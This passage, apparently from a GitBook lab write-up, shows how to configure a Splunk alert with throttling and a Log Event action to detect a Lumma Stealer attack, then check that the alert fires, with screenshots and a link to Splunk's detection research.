<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F0X8Moj29dq1VjT5d3Agq%2FScreenshot(34).png?alt=media&#x26;token=4b0a7f31-df1c-4201-a5e2-d9d97957e512" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FHD1p3ZyAYcbbONxJXt4Z%2FScreenshot(35).png?alt=media&#x26;token=ec791f59-dbca-4411-b8f1-75570ea0eca5" alt=""><figcaption></figcaption></figure>

Also let's enable throttling to prevent excessive alerts from the same issue, thereby avoiding "alert overload." Additionally, we should configure the "Log Event" action, which records the alert’s triggering details in Splunk’s internal logs (index=\_internal) or a custom index.

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F383Xhsrn0QuYlHD9oOiE%2FScreenshot(36).png?alt=media&#x26;token=507f2666-3180-495d-a734-a28ce9627860" alt=""><figcaption></figcaption></figure>

Let's initiate the attack once more and verify if an alert is triggered.

From **`Settings > Searches, Reports, and Alerts`** in the Splunk web interface.

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FxCDSrZRv33JPMM1uNe0Y%2FScreenshot(38).png?alt=media&#x26;token=a58cdb8c-fd90-4706-82d0-12600d4cbe08" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FlcXuLzMU7NB7Q0DXJBJV%2FScreenshot(39).png?alt=media&#x26;token=cb46a0cd-e52e-4f46-add9-00570b372f42" alt=""><figcaption></figcaption></figure>

Alternatively, we can verify this from the `index=main`.

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FVvb51ya8dvWlJuhj0UOj%2FScreenshot(40).png?alt=media&#x26;token=74c4f5a0-6397-4fb5-a2d9-8e7e144ce963" alt=""><figcaption></figcaption></figure>

You can explore this informative URL to learn more about the detection rules in Splunk that can be used to identify the Lumma Stealer attack: <https://research.splunk.com/stories/lumma_stealer/>